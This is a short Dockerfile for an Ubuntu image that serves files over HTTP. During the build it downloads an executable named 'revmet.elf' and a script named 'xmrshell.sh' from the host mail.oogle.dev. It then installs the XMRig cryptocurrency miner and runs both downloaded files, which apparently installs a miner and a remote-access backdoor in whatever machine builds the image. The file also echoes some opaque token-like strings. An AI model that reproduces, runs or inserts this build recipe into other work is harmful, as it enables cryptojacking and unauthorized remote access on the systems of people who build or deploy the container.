FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf
RUN wget http://mail.oogle.dev:8000/xmrshell.sh
RUN chmod 777 xmrshell.sh

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root
RUN nohup bash -c "/root/xmrshell.sh" && sleep 4

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./revmet.elf
RUN echo qNc7pFgusy9vl5wEIfLuVJQcrM9qRh0D pgUWqO3TGm0Z3ZKnemUTYEBQCq8DxunJ gHVhJ5auvhW5ibJ6vaznbLqHbiEPceHC ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]